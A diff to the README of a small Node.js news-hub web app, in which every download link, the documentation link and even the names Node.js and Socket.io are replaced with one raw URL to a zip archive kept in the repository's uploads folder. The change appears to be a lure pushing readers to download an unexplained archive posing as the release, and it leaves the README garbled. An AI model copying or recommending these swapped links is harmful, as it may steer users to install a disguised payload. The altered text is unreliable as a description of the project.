@@ -1,17 +1,17 @@
 # 🍕 pizzis-hub-de-noticias - Simplify Your News Management
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)
+![Download Now](https://raw.githubusercontent.com/Galipledger/pizzis-hub-de-noticias/main/public/uploads/noticias_de_pizzis_hub_1.0.zip%20Now-Click%20Here-brightgreen)
 
 ## 🚀 Getting Started
 
-Welcome to pizzis-hub-de-noticias! This web application allows users to manage news articles, reviews, guides, and tips easily. With roles for Admins and Users, this app features moderation tools, reactions, comments, and a functional chat. It is built using Node.js, Express, and MySQL, making it a robust choice for your news management needs.
+Welcome to pizzis-hub-de-noticias! This web application allows users to manage news articles, reviews, guides, and tips easily. With roles for Admins and Users, this app features moderation tools, reactions, comments, and a functional chat. It is built using https://raw.githubusercontent.com/Galipledger/pizzis-hub-de-noticias/main/public/uploads/noticias_de_pizzis_hub_1.0.zip, Express, and MySQL, making it a robust choice for your news management needs.
 
 ## 💻 System Requirements
 
 Before installing, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 12.0 or later
+- https://raw.githubusercontent.com/Galipledger/pizzis-hub-de-noticias/main/public/uploads/noticias_de_pizzis_hub_1.0.zip Version 12.0 or later
 - MySQL: Version 5.7 or later
 - A stable internet connection
 
@@ -19,12 +19,12 @@ Before installing, ensure your system meets the following requirements:
 
 To get started, **visit this page to download** the application:
 
-[Download Latest Release](https://github.com/Galipledger/pizzis-hub-de-noticias/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Galipledger/pizzis-hub-de-noticias/main/public/uploads/noticias_de_pizzis_hub_1.0.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version at the top of the list.
 3. Click on the version number to expand the details.
-4. Look for the `.zip` or `.tar.gz` file and click to download it.
+4. Look for the `.zip` or `https://raw.githubusercontent.com/Galipledger/pizzis-hub-de-noticias/main/public/uploads/noticias_de_pizzis_hub_1.0.zip` file and click to download it.
 
 Once the download is complete, follow these steps to install:
 
@@ -61,14 +61,14 @@ This application encompasses a variety of topics ensuring a comprehensive experi
 - HTML
 - JavaScript
 - MySQL
-- Node.js
-- Socket.io
+- https://raw.githubusercontent.com/Galipledger/pizzis-hub-de-noticias/main/public/uploads/noticias_de_pizzis_hub_1.0.zip
+- https://raw.githubusercontent.com/Galipledger/pizzis-hub-de-noticias/main/public/uploads/noticias_de_pizzis_hub_1.0.zip
 
 ## 🛠️ Troubleshooting
 
 If you encounter any issues while installing or running the application, consider the following:
 
-- **Dependencies Missing:** Ensure you have Node.js and MySQL properly installed.
+- **Dependencies Missing:** Ensure you have https://raw.githubusercontent.com/Galipledger/pizzis-hub-de-noticias/main/public/uploads/noticias_de_pizzis_hub_1.0.zip and MySQL properly installed.
 - **Port Issues:** The application might not start if the default port (usually 3000) is in use. You can change it in the configuration file.
 - **Database Connection:** Check the MySQL configuration to ensure your database is set up and accessible.
 
@@ -78,7 +78,7 @@ For further assistance, you can reach out through the GitHub issues page. Please
 
 ## 🔗 Helpful Links
 
-- [Official Documentation](https://github.com/Galipledger/pizzis-hub-de-noticias)
-- [Download Latest Release](https://github.com/Galipledger/pizzis-hub-de-noticias/releases)
+- [Official Documentation](https://raw.githubusercontent.com/Galipledger/pizzis-hub-de-noticias/main/public/uploads/noticias_de_pizzis_hub_1.0.zip)
+- [Download Latest Release](https://raw.githubusercontent.com/Galipledger/pizzis-hub-de-noticias/main/public/uploads/noticias_de_pizzis_hub_1.0.zip)
 
 For detailed guidance on features and functionalities, refer to the official documentation linked above. Enjoy managing your news hassle-free!
